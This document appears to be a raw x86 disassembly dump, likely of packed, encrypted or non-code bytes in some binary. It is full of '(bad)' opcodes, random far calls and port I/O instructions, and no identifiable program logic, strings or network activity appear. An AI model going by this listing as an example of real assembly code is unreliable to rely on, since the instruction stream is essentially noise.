  4199b9:	dec    ebx
  4199ba:	mov    ?,WORD PTR [edi]
  4199bc:	adc    eax,DWORD PTR ds:0x3bf15472
  4199c2:	pop    ds
  4199c3:	and    al,0xcb
  4199c5:	mov    bh,0x44
  4199c7:	test   eax,esp
  4199c9:	fist   WORD PTR [ebp+0x42]
  4199cc:	and    ecx,DWORD PTR [ebx-0x449babcd]
  4199d2:	push   cs
  4199d3:	loop   0x4199f5
  4199d5:	mov    eax,0x144ba555
  4199da:	leave  
  4199db:	dec    eax
  4199dc:	les    ebx,FWORD PTR ds:0x10013086
  4199e2:	lahf   
  4199e3:	(bad)  
  4199e4:	mov    edi,0xdbd0c2c7
  4199e9:	sub    DWORD PTR [esi+0x48a188f8],0xffffffb0
  4199f0:	pop    ecx
  4199f1:	cwde   
  4199f2:	stc    
  4199f3:	fwait
  4199f4:	not    BYTE PTR [ebx]
  4199f6:	cwde   
  4199f7:	dec    esp
  4199f8:	push   eax
  4199f9:	pop    eax
  4199fa:	or     DWORD PTR [edx],eax
  4199fc:	test   esi,ebp
  4199fe:	aad    0x61
  419a00:	jl     0x4199fb
  419a02:	adc    edi,edi
  419a04:	jle    0x4199e5
  419a06:	(bad)  
  419a07:	mov    al,ds:0xf57651e3
  419a0c:	ja     0x41999d
  419a0e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419a0f:	dec    edi
  419a10:	pop    ds
  419a11:	mov    ch,0x11
  419a13:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419a14:	jle    0x4199e7
  419a16:	scas   eax,DWORD PTR es:[edi]
  419a17:	(bad)  
  419a18:	jne    0x4199c0
  419a1a:	loopne 0x4199ed
  419a1c:	inc    eax
  419a1d:	mov    eax,0x3292a88e
  419a22:	cmp    DWORD PTR [ebp-0x2d],0x66
  419a26:	mov    cl,0x5b
  419a28:	pushf  
  419a29:	push   ebp
  419a2a:	je     0x419a63
  419a2c:	shl    DWORD PTR [esi+0x406634be],1
  419a32:	adc    BYTE PTR [edx+0x1d],0xd0
  419a36:	inc    ebp
  419a37:	xchg   ecx,eax
  419a38:	outs   dx,BYTE PTR ds:[esi]
  419a39:	mov    dl,0x1b
  419a3b:	inc    eax
  419a3d:	lods   al,BYTE PTR ds:[esi]
  419a3e:	jge    0x419ab5
  419a40:	sbb    eax,0x0
	...
  419ab1:	add    BYTE PTR [eax],al
  419ab3:	add    BYTE PTR [ebx+edx*1-0x7b],bh
  419ab7:	xor    ch,bh
  419ab9:	mov    dh,0xff
  419abb:	pop    edi
  419abc:	mov    ebp,0x28357b47
  419ac1:	push   0xffffff99
  419ac3:	in     al,dx
  419ac4:	pop    ebx
  419ac5:	push   ss
  419ac6:	add    DWORD PTR [eax],eax
  419ac8:	cmc    
  419ac9:	add    BYTE PTR [eax],al
  419acb:	add    ch,cl
  419acd:	push   ebx
  419ace:	(bad)  
  419ad0:	addr16 mov dl,0x8c
  419ad3:	adc    BYTE PTR [edi],bh
  419ad5:	xor    BYTE PTR [ebx],ch
  419ad7:	mov    esp,0xea128505
  419adc:	rol    BYTE PTR ds:0xb1d13c5a,cl
  419ae2:	xchg   ebx,eax
  419ae3:	(bad)
  419ae6:	dec    esi
  419ae7:	aam    0xdf
  419ae9:	bound  esi,QWORD PTR [ecx]
  419aeb:	retf   
  419aec:	sbb    BYTE PTR [ecx+0x643bf4f],dh
  419af2:	xchg   BYTE PTR [esi],ch
  419af4:	outs   dx,BYTE PTR ds:[esi]
  419af5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419af6:	adc    ah,BYTE PTR [edi-0x531a7957]
  419afc:	mov    bl,0xa2
  419afe:	sub    ch,BYTE PTR [esi-0x80]
  419b01:	bound  edx,QWORD PTR [edx-0x55475666]
  419b07:	cmp    ecx,DWORD PTR [ebp-0x63]
  419b0a:	xor    eax,0x1fd333d9
  419b0f:	sbb    esp,ebx
  419b11:	not    BYTE PTR [eax-0x14]
  419b14:	mov    edx,0xa041a9e3
  419b19:	sahf   
  419b1a:	xchg   ebx,eax
  419b1b:	out    0x39,al
  419b1d:	jno    0x419aa4
  419b1f:	xor    ebx,esp
  419b21:	mov    esi,0x5f4db28b
  419b26:	jbe    0x419b4f
  419b28:	mov    edx,0xba7d42e5
  419b2d:	lock idiv edx
  419b30:	cmc    
  419b31:	popa   
  419b32:	ror    DWORD PTR [esi],0x7e
  419b35:	or     eax,0xae8f2e63
  419b3a:	fdivr  QWORD PTR [eax]
  419b3c:	(bad)  
  419b3d:	mov    esp,0xc39af7b7
  419b42:	push   esp
  419b43:	mov    dl,0xf9
  419b45:	mov    ecx,0xb549e40
  419b4a:	sbb    BYTE PTR [edi],bh
  419b4c:	in     eax,dx
  419b4d:	xor    BYTE PTR [ebp+esi*4-0x29810634],bh
  419b54:	pop    esp
  419b55:	stos   DWORD PTR es:[edi],eax
  419b56:	xor    al,0xff
  419b58:	add    BYTE PTR [eax-0x4b],0xb5
  419b5c:	xor    al,0x32
  419b5e:	add    edx,DWORD PTR [ecx-0x32]
  419b61:	shl    DWORD PTR [esi+0x6d],cl
  419b64:	mov    bh,bl
  419b66:	inc    ebx
  419b67:	les    edx,FWORD PTR ds:0x8ce284d9
  419b6d:	sbb    al,0x24
  419b6f:	jg     0x419b8e
  419b71:	bound  ecx,QWORD PTR [ebx+eiz*4]
  419b74:	(bad)  
  419b75:	xchg   ecx,eax
  419b76:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419b77:	add    edi,DWORD PTR [edi+edi*2+0x6cd51b90]
  419b7e:	jb     0x419b9d
  419b80:	jb     0x419b05
  419b82:	xor    eax,0xf0f8f6b9
  419b87:	daa    
  419b88:	mov    esi,DWORD PTR [ecx+eax*2+0x38]
  419b8c:	push   ecx
  419b8d:	xchg   ebp,eax
  419b8e:	into   
  419b8f:	xchg   esp,eax
  419b90:	loop   0x419bc6
  419b92:	pop    eax
  419b93:	sub    BYTE PTR [edi],bl
  419b95:	loop   0x419bb1
  419b97:	add    al,0xc1
  419b99:	sub    dh,dl
  419b9b:	fstp   DWORD PTR [ecx-0x6890f2a]
  419ba1:	(bad)  
  419ba2:	mov    al,ds:0x3c7d098
  419ba7:	inc    edx
  419ba8:	xor    edi,DWORD PTR [esi+0x2b16e908]
  419bae:	fs arpl bp,ax
  419bb1:	loope  0x419bd8
  419bb3:	imul   edi,DWORD PTR [edi+0x34],0xffffffd0
  419bb7:	push   ss
  419bb8:	pusha  
  419bb9:	fnstenv [edx-0x3b]
  419bbc:	dec    edx
  419bbd:	fwait
  419bbe:	int    0xa0
  419bc0:	loop   0x419bc2
	...
  419c32:	add    BYTE PTR [eax],al
  419c34:	sti    
  419c35:	inc    edx
  419c36:	out    dx,al
  419c37:	aas    
  419c38:	(bad)  
  419c39:	mov    edi,0x157c6fb
  419c3e:	sub    esi,0xffffffed
  419c41:	stc    
  419c42:	inc    ebp
  419c43:	and    edx,DWORD PTR [eax+0x17]
  419c46:	add    DWORD PTR [eax],eax
  419c48:	cmc    
  419c49:	add    BYTE PTR [eax],al
  419c4b:	add    BYTE PTR [edi-0x2f],dh
  419c4e:	rol    BYTE PTR [ecx+ebp*2+0x622c8311],0x2a
  419c56:	jno    0x419c99
  419c58:	(bad)
  419c5b:	mov    esp,0xbffbbab5
  419c60:	les    edi,FWORD PTR [eax+0x71]
  419c63:	fild   QWORD PTR [ebx+eiz*2]
  419c66:	pop    esp
  419c67:	bound  edi,QWORD PTR [edi]
  419c69:	and    bh,BYTE PTR [eax+0x1f]
  419c6c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419c6d:	pushf  
  419c6e:	aaa    
  419c6f:	mov    dh,bh
  419c71:	arpl   WORD PTR [eax-0x42],bx
  419c74:	xchg   edx,eax
  419c75:	sbb    eax,0x9c89e6dc
  419c7a:	pushf  
  419c7b:	push   ebp
  419c7c:	bound  esi,QWORD PTR [edi*4+0x61521dd6]
  419c83:	jb     0x419c9d
  419c85:	aam    0x4a
  419c87:	call   0xc90:0xb3a62b32
  419c8e:	jne    0x419c22
  419c90:	dec    edi
  419c91:	(bad)  
  419c92:	aad    0xae
  419c94:	dec    edi
  419c95:	enter  0x8b24,0xc5
  419c99:	dec    edi
  419c9a:	mov    esp,0x5c65dc06
  419c9f:	ds pusha 
  419ca1:	adc    dh,BYTE PTR [ebx-0x35fc5d16]
  419ca7:	adc    bh,BYTE PTR [ecx-0x74]
  419caa:	leave  
  419cab:	iret   
  419cac:	and    DWORD PTR [eax+eiz*8-0x76],ecx
  419cb0:	aad    0x42
  419cb2:	mov    dl,0xd9
  419cb4:	jmp    0x419c54
  419cb6:	xlat   BYTE PTR ds:[ebx]
  419cb7:	dec    dx
  419cb9:	sbb    esi,DWORD PTR [ecx]
  419cbb:	es loop 0x419c5b
  419cbe:	mov    ch,BYTE PTR [ebp-0x6]
  419cc1:	loop   0x419ca1
  419cc3:	test   eax,0xbb5a0a57
  419cc8:	push   esp
  419cc9:	fst    QWORD PTR [esi+ebx*2+0x5b472b0d]
  419cd0:	sub    eax,0x8695585e
  419cd5:	cwde   
  419cd6:	cli    
  419cd7:	jmp    DWORD PTR es:[esi+0x387ae349]
  419cde:	jno    0x419ce1
  419ce0:	mov    eax,0xfe629195
  419ce5:	add    eax,ecx
  419ce7:	out    0x9,al
  419ce9:	int3   
  419cea:	fwait
  419ceb:	shl    DWORD PTR [eax+0x674d9fb7],cl
  419cf1:	into   
  419cf2:	aam    0x7a
  419cf4:	and    BYTE PTR [ebx-0x3e97fd55],0xe
  419cfb:	daa    
  419cfc:	jns    0x419c7f
  419cfe:	xchg   ecx,eax
  419d00:	add    BYTE PTR [ebp-0x61],cl
  419d03:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419d04:	sbb    cl,BYTE PTR [ebp+0x6f]
  419d07:	jae    0x419d58
  419d09:	lds    ebp,FWORD PTR [ebp+0x78]
  419d0c:	scas   eax,DWORD PTR es:[edi]
  419d0d:	add    DWORD PTR ds:0x13478712,esi
  419d13:	xor    DWORD PTR [edx+ecx*2+0x10349f33],0x5e
  419d1b:	and    dh,al
  419d1d:	data16 mov dh,0xf4
  419d20:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419d21:	adc    al,0x5c
  419d23:	stc    
  419d24:	mov    ecx,DWORD PTR [eax+0x31496021]
  419d2a:	leave  
  419d2b:	sahf   
  419d2c:	jne    0x419da7
  419d2e:	push   ebx
  419d2f:	adc    BYTE PTR [ebx],0x59
  419d32:	enter  0xe55c,0x26
  419d36:	mov    ch,0x84
  419d38:	fist   DWORD PTR [ebx+0x299af69b]
  419d3e:	fst    DWORD PTR [esi+0xf]
	...
  419db4:	push   cs
  419db5:	bnd call 0xde7c99eb
  419dbb:	(bad)  
  419dbc:	jp     0x419e27
  419dbe:	xchg   edi,eax
  419dbf:	inc    esp
  419dc0:	push   ebp
  419dc1:	sub    ecx,DWORD PTR [ebx+0x1184585]
  419dc7:	add    ch,dh
  419dc9:	add    BYTE PTR [eax],al
  419dcb:	add    BYTE PTR [ebp-0x1d],al
  419dce:	loop   0x419d6c
  419dd0:	or     al,0xea
  419dd2:	pop    ss
  419dd3:	xor    BYTE PTR [edi+eax*4+0x55],ah
  419dd7:	sub    esp,esp
  419dd9:	stc    
  419dda:	stos   BYTE PTR es:[edi],al
  419ddb:	dec    edx
  419ddc:	cmp    BYTE PTR [ebx],bl
  419dde:	pop    ebp
  419ddf:	mov    ebp,DWORD PTR [esi+0x604c88a2]
  419de5:	mov    DWORD PTR [esi-0x22],0xf104a930
  419dec:	mov    bl,cl
  419dee:	mov    al,ds:0x3b45e6d0
  419df3:	xor    ebx,edx
  419df5:	dec    ecx
  419df6:	dec    esi
  419df7:	mov    ah,0x26
  419df9:	sub    eax,0xd377b414
  419dfe:	push   eax
  419dff:	fcmovnb st,st(7)
  419e01:	or     edi,DWORD PTR [edi+edi*2-0x16683313]
  419e08:	cwde   
  419e09:	sub    eax,0x9731169b
  419e0e:	repz cwde 
  419e10:	mov    bl,0x55
  419e12:	jnp    0x419ddd
  419e14:	xor    DWORD PTR [eax-0x32],ecx
  419e17:	xor    dl,ah
  419e19:	in     al,0x9a
  419e1b:	daa    
  419e1c:	sbb    al,0x9c
  419e1e:	arpl   WORD PTR [ebp-0x6e0bfa55],dx
  419e24:	ret    0x7c03
  419e27:	dec    eax
  419e28:	or     DWORD PTR [ecx+0x538baf43],ecx
  419e2e:	pop    es
  419e2f:	pop    es
  419e30:	iret   
  419e31:	jmp    0x8c9565f4
  419e36:	mov    esp,DWORD PTR [edx+eiz*8]
  419e39:	pushf  
  419e3a:	sub    dl,bl
  419e3c:	cwde   
  419e3d:	out    0xdb,al
  419e3f:	into   
  419e40:	mov    bh,0x28
  419e42:	xchg   DWORD PTR [ecx],edi
  419e44:	cmp    bh,bl
  419e46:	imul   esi,DWORD PTR [edx+0x6a17323f],0xffffffc3
  419e4d:	dec    ecx
  419e4e:	loopne 0x419e16
  419e50:	xor    BYTE PTR [edx+0x8dbc7e0],ah
  419e56:	xchg   esi,ecx
  419e58:	(bad)  
  419e59:	into   
  419e5a:	mov    al,ds:0xb11e5610
  419e5f:	sbb    BYTE PTR [edi+0x26ca8931],0x76
  419e66:	add    edx,DWORD PTR [eax]
  419e68:	out    0x3b,eax
  419e6a:	hlt    
  419e6b:	lock in al,dx
  419e6d:	dec    esp
  419e6e:	mov    edi,0xd2e6f839
  419e73:	or     al,BYTE PTR ds:0x2a6f8f81
  419e79:	sub    dl,ch
  419e7b:	stos   BYTE PTR es:[edi],al
  419e7c:	jb     0x419e8f
  419e7e:	xchg   esi,eax
  419e7f:	sub    BYTE PTR [edi+0x40],bh
  419e82:	das    
  419e83:	fimul  DWORD PTR [eax-0x2b879a6e]
  419e89:	lahf   
  419e8a:	pop    es
  419e8b:	xchg   al,bh
  419e8d:	jge    0x419e11
  419e8f:	aad    0xba
  419e91:	xchg   ch,ah
  419e93:	mov    ds:0xe190188,al
  419e98:	push   edi
  419e99:	scas   eax,DWORD PTR es:[edi]
  419e9a:	sub    esi,ebp
  419e9c:	cmp    DWORD PTR [ecx+0x54],edx
  419e9f:	stc    
  419ea0:	div    BYTE PTR [edx]
  419ea2:	es xor al,0x86
  419ea5:	push   cs
  419ea6:	fdivr  st,st(2)
  419ea8:	imul   ecx,DWORD PTR [edi],0x6b
  419eab:	jns    0x419f1c
  419ead:	je     0x419ea4
  419eaf:	xchg   esi,eax
  419eb0:	push   ds
  419eb1:	fisub  WORD PTR [edx]
  419eb3:	cdq    
  419eb4:	xor    dh,BYTE PTR [ebx-0x1472dad4]
  419eba:	cdq    
  419ebb:	test   eax,0x5b918207
  419ec0:	add    BYTE PTR es:[eax],al
	...
  419f33:	add    BYTE PTR [edi+edx*4],bl
  419f36:	in     al,0x47
  419f38:	out    dx,eax
  419f39:	ja     0x419efa
  419f3b:	fbstp  TBYTE PTR [ebx-0x5061f4b7]
  419f41:	mov    ch,0x11
  419f43:	je     0x419f7f
  419f45:	sbb    DWORD PTR [ecx],eax
  419f47:	add    ch,dh
  419f49:	add    BYTE PTR [eax],al
  419f4b:	add    bh,bh
  419f4d:	pop    edx
  419f4e:	inc    esi
  419f4f:	adc    dl,dl
  419f51:	inc    edx
  419f52:	and    bh,BYTE PTR ds:0x5341e1fe
  419f58:	es aam 0xa6
  419f5b:	cmp    bl,bh
  419f5d:	cmp    dl,BYTE PTR [edx]
  419f5f:	mov    esi,0x535e0377
  419f64:	mov    ds:0x67def7e,eax
  419f69:	or     BYTE PTR [esi+0x60],0xcd
  419f6d:	mov    bh,0x7a
  419f6f:	sub    dl,dl
  419f71:	je     0x419f83
  419f73:	loopne 0x419f3d
  419f75:	inc    ecx
  419f76:	push   es
  419f77:	push   ds
  419f78:	dec    edx
  419f79:	mov    edx,0x587704d8
  419f7e:	pop    ecx
  419f7f:	xor    bh,BYTE PTR [edi-0x35]
  419f82:	cmc    
  419f83:	xchg   esp,eax
  419f84:	xchg   BYTE PTR [esi],al
  419f86:	mov    eax,ds:0x1133ae71
  419f8b:	push   esi
  419f8c:	cmp    eax,DWORD PTR [edi+edi*2]
  419f8f:	xor    eax,0x7908bae2
  419f94:	or     ecx,DWORD PTR [eax-0x29]
  419f97:	jg     0x419f9b
  419f99:	pop    esi
  419f9a:	loope  0x419ffb
  419f9c:	push   cs
  419f9d:	inc    edx
  419f9e:	fisubr DWORD PTR [esi]
  419fa0:	xchg   esp,eax
  419fa1:	scas   eax,DWORD PTR es:[edi]
  419fa2:	outs   dx,BYTE PTR ds:[esi]
  419fa3:	in     al,0x7b
  419fa5:	out    0x7b,al
  419fa7:	or     dl,BYTE PTR [ebx+edi*1]
  419faa:	and    ecx,DWORD PTR [ebp-0x23]
  419fad:	mov    dh,0xb6
  419faf:	and    al,0x1f
  419fb1:	or     dl,dh
  419fb3:	xchg   DWORD PTR ds:0x2d094bff,ecx
  419fb9:	fist   DWORD PTR [eax+eax*8+0x24]
  419fbd:	push   cs
  419fbe:	fldenv [edx+0x27]
  419fc1:	sub    eax,DWORD PTR [edx+0x70]
  419fc4:	push   esi
  419fc5:	test   dh,cl
  419fc7:	call   0xaf3d:0x929196b4
  419fce:	ss mov esi,0x112401aa
  419fd4:	lods   al,BYTE PTR ds:[esi]
  419fd5:	das    
  419fd6:	fld    TBYTE PTR [ebx-0x513fa580]
  419fdc:	xlat   BYTE PTR ds:[ebx]
  419fdd:	shl    BYTE PTR [eax],0xd5
  419fe0:	repz jae 0x419fc6
  419fe3:	mov    eax,ds:0x95d95b53
  419fe8:	fisttp DWORD PTR [eax-0xd65a07a]
  419fee:	clc    
  419fef:	inc    ebp
  419ff0:	mov    edx,0xed8360f7
  419ff5:	aad    0x94
  419ff7:	ins    DWORD PTR es:[edi],dx
  419ff8:	jl     0x419f9c
  419ffa:	addr16 add ebx,edx
  419ffd:	call   0xf597:0xa522e1b2
  41a004:	xor    BYTE PTR [esi-0x35],0x7f
  41a008:	pop    ds
  41a009:	popf   
  41a00a:	sub    ch,BYTE PTR [esi]
  41a00c:	jmp    0x41a068
  41a00e:	cmp    eax,0x53b86fee
  41a013:	das    
  41a014:	sub    al,0xf4
  41a016:	call   0x3940018d
  41a01b:	pop    ebp
  41a01c:	or     al,0xd4
  41a01e:	mov    eax,0xa6efb884
  41a023:	imul   eax,DWORD PTR [bx],0x7f7a5db3
  41a02a:	int    0x13
  41a02c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a02d:	imul   esp,DWORD PTR [ebx-0x60e93fde],0xffffffab
  41a034:	or     ah,dl
  41a036:	xor    dh,ah
  41a038:	push   ebx
  41a039:	popa   
  41a03a:	and    DWORD PTR [eax+0x41],0x120fa741
	...
  41a0b1:	add    BYTE PTR [eax],al
  41a0b3:	add    BYTE PTR [edi-0x41bd617b],ch
  41a0b9:	pop    ebx
  41a0ba:	(bad)  
  41a0bb:	in     eax,dx
  41a0bc:	(bad)  ds:0x5b5404a2
  41a0c2:	out    0x2,eax
  41a0c4:	das    
  41a0c5:	sbb    al,BYTE PTR [ecx]
  41a0c7:	add    ch,dh
  41a0c9:	add    BYTE PTR [eax],al
  41a0cb:	add    BYTE PTR [edx],ch
  41a0cd:	loop   0x41a0e1
  41a0cf:	xor    ch,bl
  41a0d1:	push   ebp
  41a0d2:	lods   eax,DWORD PTR ds:[esi]
  41a0d3:	cli    
  41a0d4:	cmp    eax,DWORD PTR [eax+eiz*8+0x31]
  41a0d8:	int    0xbf
  41a0da:	dec    edi
  41a0db:	pop    ds
  41a0dc:	mov    ebx,edi
  41a0de:	push   edi
  41a0df:	retf   
  41a0e0:	adc    DWORD PTR [edx-0x3d],ecx
  41a0e3:	mov    dh,0x2a
  41a0e5:	xchg   edx,edi
  41a0e7:	mov    ah,0x2c
  41a0e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a0ea:	mov    bh,0x21
  41a0ec:	aaa    
  41a0ed:	(bad)  
  41a0ee:	cwde   
  41a0ef:	xchg   DWORD PTR [ecx],edi
  41a0f1:	fiadd  DWORD PTR [ecx+0x5a8931c1]
  41a0f7:	loope  0x41a0ca
  41a0f9:	adc    al,ah
  41a0fb:	ja     0x41a145
  41a0fd:	sbb    DWORD PTR [eax-0x180e4969],edx
  41a103:	xor    eax,0x19f42cb4
  41a108:	aam    0x1a
  41a10a:	mov    ch,0x4f
  41a10c:	push   0xffffffb4
  41a10e:	xchg   edi,eax
  41a10f:	pusha  
  41a110:	xor    DWORD PTR [edi],0x8bd052e7
  41a116:	repz mov ds:0x164423f,eax
  41a11c:	ficom  WORD PTR [edx]
  41a11e:	push   eax
  41a11f:	cmp    BYTE PTR [edx],dh
  41a121:	test   DWORD PTR [eax],ebx
  41a123:	(bad)  
  41a124:	stos   DWORD PTR es:[edi],eax
  41a125:	neg    DWORD PTR [eax]
  41a127:	fild   WORD PTR ds:0xfa137037
  41a12d:	outs   dx,BYTE PTR ds:[esi]
  41a12e:	jle    0x41a101
  41a130:	dec    esi
  41a131:	shl    DWORD PTR [edx],0xbb
  41a134:	push   esi
  41a135:	lods   eax,DWORD PTR ds:[esi]
  41a136:	rol    DWORD PTR [ebx],1
  41a138:	jge    0x41a1af
  41a13a:	adc    BYTE PTR [eax-0x254f754f],ah
  41a140:	inc    esi
  41a141:	add    edi,DWORD PTR [esi+0x55]
  41a144:	mov    es,WORD PTR [ebp+0x29]
  41a147:	pop    ss
  41a148:	inc    bp
  41a14a:	mov    cl,0xeb
  41a14c:	push   ds
  41a14d:	pop    eax
  41a14e:	nop
  41a14f:	leave  
  41a150:	addr16 dec edi
  41a152:	and    al,0x35
  41a154:	repnz arpl cx,bp
  41a157:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a158:	cmp    BYTE PTR [ecx],ch
  41a15a:	imul   ecx,DWORD PTR [ebx],0x57c03c27
  41a160:	and    al,0x73
  41a162:	scas   eax,DWORD PTR es:[edi]
  41a163:	ss push edi
  41a165:	popf   
  41a166:	push   ecx
  41a167:	cmp    ah,BYTE PTR [eax+0x45d25a3d]
  41a16d:	out    0xd2,eax
  41a16f:	mov    edx,0xe6a1952f
  41a174:	or     BYTE PTR [edi-0x5e],dl
  41a177:	pop    edx
  41a178:	mov    cl,0x93
  41a17a:	call   0xe7a164bd
  41a17f:	inc    edx
  41a180:	loopne 0x41a10b
  41a182:	jmp    0x41a14c
  41a184:	sar    DWORD PTR [ebp-0x45],cl
  41a187:	rep ins DWORD PTR es:[edi],dx
  41a189:	mov    esi,0x18ca131e
  41a18e:	push   ecx
  41a18f:	in     al,0x5c
  41a191:	sbb    bl,cl
  41a193:	aad    0x39
  41a195:	ret    
  41a196:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a197:	js     0x41a197
  41a199:	mov    esp,0xb025d21a
  41a19e:	in     al,dx
  41a19f:	xor    BYTE PTR [esi],0xf0
  41a1a2:	sub    dh,bl
  41a1a4:	fld    st(4)
  41a1a6:	rol    esp,cl
  41a1a8:	sbb    eax,0x91397d4e
  41a1ad:	xor    BYTE PTR [eax],bh
  41a1af:	lea    esi,[ecx-0x6ac3a32]
  41a1b5:	leave  
  41a1b6:	in     al,0x91
  41a1b8:	inc    ebp
  41a1b9:	in     al,dx
  41a1ba:	sub    DWORD PTR ds:0x41d21b8f,eax
  41a1c0:	xor    eax,0x0
	...
  41a231:	add    BYTE PTR [eax],al
  41a233:	add    BYTE PTR [eax-0xcc4519],ah
  41a239:	jg     0x41a1e4
  41a23b:	imul   DWORD PTR [esi+eiz*4]
  41a23e:	push   edi
  41a23f:	idiv   BYTE PTR [eax+0x2466a7ce]
  41a245:	sbb    eax,DWORD PTR [ecx]
  41a247:	add    ch,dh
  41a249:	add    BYTE PTR [eax],al
  41a24b:	add    dl,bl
  41a24d:	jmp    FWORD PTR [ecx+0x1b057098]
  41a253:	call   0x9283:0x1f0a7772
  41a25a:	sub    BYTE PTR [ebx+edi*2+0x69c341e],bh
  41a261:	inc    ebp
  41a262:	lods   al,BYTE PTR ds:[esi]
  41a263:	lds    ebx,FWORD PTR [ecx]
  41a265:	or     eax,0x214585f9
  41a26a:	cld    
  41a26b:	mov    ds:0x76cf7497,al
  41a270:	sbb    esp,DWORD PTR [eax]
  41a272:	int3   
  41a273:	lods   eax,DWORD PTR ds:[esi]
  41a274:	jns    0x41a2d2
  41a276:	(bad)  [edx+esi*8+0x76]
  41a27a:	cwde   
  41a27b:	lea    eax,[edx]
  41a27d:	fwait
  41a27e:	stos   DWORD PTR es:[edi],eax
  41a27f:	and    eax,0x4851db7b
  41a284:	imul   esp,DWORD PTR [esi-0x64f86bbe],0x70
  41a28b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a28c:	mov    dl,0xee
  41a28e:	shl    ecx,1
  41a290:	adc    eax,DWORD PTR [edx+0x18df2ce8]
  41a296:	dec    edx
  41a297:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a298:	cmp    eax,DWORD PTR [eax+0x29]
  41a29b:	imul   esp,esp,0x70912be8
  41a2a1:	dec    ebx
  41a2a2:	rcl    bh,cl
  41a2a4:	icebp  
  41a2a5:	stos   BYTE PTR es:[edi],al
  41a2a6:	mov    ah,0x5d
  41a2a8:	out    dx,eax
  41a2a9:	repz adc eax,0xaf3f8881
  41a2af:	aas    
  41a2b0:	out    0xe4,al
  41a2b2:	fsin   
  41a2b4:	in     eax,0xbb
  41a2b6:	popf   
  41a2b7:	and    edi,DWORD PTR [eax+0x4ae15059]
  41a2bd:	call   0xd132:0x20f4eca6
  41a2c4:	ja     0x41a2ef
  41a2c6:	outs   dx,DWORD PTR ds:[esi]
  41a2c7:	stos   BYTE PTR es:[edi],al
  41a2c8:	push   edi
  41a2c9:	stc    
  41a2ca:	mov    ebx,0x7c6bc992
  41a2cf:	mov    eax,ds:0xae6fd44e
  41a2d4:	(bad)  
  41a2d5:	in     eax,dx
  41a2d6:	mov    al,ds:0x2031c9c6
  41a2db:	ret    0xfac6
  41a2de:	shr    DWORD PTR [edi-0x37],1
  41a2e1:	(bad)  
  41a2e2:	out    0x1,al
  41a2e4:	sub    al,0xcf
  41a2e6:	dec    edx
  41a2e7:	jmp    0x41a2ab
  41a2e9:	stos   BYTE PTR es:[edi],al
  41a2ea:	fistp  DWORD PTR [ebx+0x249741c8]
  41a2f0:	jmp    0xb762:0x55601aab
  41a2f7:	in     eax,0xa5
  41a2f9:	push   ds
  41a2fa:	call   0x2e820ed8
  41a2ff:	cld    
  41a300:	push   ecx
  41a301:	fild   QWORD PTR [edx]
  41a303:	shl    DWORD PTR [ebx+esi*1-0x79],cl
  41a307:	out    dx,al
  41a308:	pop    ds
  41a309:	stos   BYTE PTR es:[edi],al
  41a30a:	xchg   BYTE PTR [esi+0x70],ch
  41a30d:	iret   
  41a30e:	stc    
  41a30f:	pop    es
  41a310:	hlt    
  41a311:	sub    BYTE PTR [edi],al
  41a313:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a314:	cmp    ah,cl
  41a316:	enter  0xe1b1,0x8d
  41a31a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a31b:	icebp  
  41a31c:	and    BYTE PTR [eax+0x34],dh
  41a31f:	shl    al,cl
  41a321:	fs lods eax,DWORD PTR gs:[esi]
  41a324:	jae    0x41a380
  41a326:	pop    eax
  41a327:	jo     0x41a2dc
  41a329:	adc    BYTE PTR [edx+0x39],ch
  41a32c:	aaa    
  41a32d:	int3   
  41a32e:	bound  ebx,QWORD PTR [edi-0x3b]
  41a331:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a332:	or     BYTE PTR [esp+ecx*1-0x67],dl
  41a336:	fistp  DWORD PTR [eax+0x5b]
  41a339:	jg     0x41a369
  41a33b:	stos   DWORD PTR es:[edi],eax
  41a33c:	pop    esi
  41a33d:	sbb    bh,0xa9
  41a340:	mov    al,0x0
	...
  41a3b2:	add    BYTE PTR [eax],al
  41a3b4:	cmp    eax,0xed3a6998
  41a3b9:	sti    
  41a3ba:	jg     0x41a35b
  41a3bc:	and    DWORD PTR [esi+edx*4+0x6a],ebp
  41a3c0:	mov    ds:0x19fc2fb3,al
  41a3c5:	sbb    al,0x1
  41a3c7:	add    ch,dh
  41a3c9:	add    BYTE PTR [eax],al
  41a3cb:	add    BYTE PTR [ebp+edx*8-0x5a],dl
  41a3cf:	pop    ebx
  41a3d0:	daa    
  41a3d1:	jnp    0x41a401
  41a3d3:	ret    0xb0fa
  41a3d6:	mov    esp,0xd2378e09
  41a3db:	sub    BYTE PTR [ebp+0x59573a18],bl
  41a3e1:	fdiv   QWORD PTR [ecx+0x63]
  41a3e4:	js     0x41a3db
  41a3e6:	iret   
  41a3e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a3e8:	pop    ds
  41a3e9:	test   eax,0xa4809a80
  41a3ee:	loop   0x41a3d2
  41a3f0:	sti    
  41a3f1:	int3   
  41a3f2:	cmp    DWORD PTR [edx+eiz*4],edi
  41a3f5:	jns    0x41a412
  41a3f7:	outs   dx,BYTE PTR ds:[esi]
  41a3f8:	mov    fs,WORD PTR [edx-0xf]
  41a3fb:	(bad)  
  41a3fd:	gs push ebp
  41a3ff:	xchg   ah,dh
  41a401:	sar    DWORD PTR [edx],1
  41a403:	dec    esp
  41a404:	jp     0x41a46b
  41a406:	sub    BYTE PTR [edi+eax*4],cl
  41a409:	jmp    0xbdf8765c
  41a40e:	push   esi
  41a40f:	scas   al,BYTE PTR es:[edi]
  41a410:	sbb    al,0xc0
  41a412:	jmp    0x89d:0xf049ae87
  41a419:	shl    DWORD PTR [ecx-0x73],1
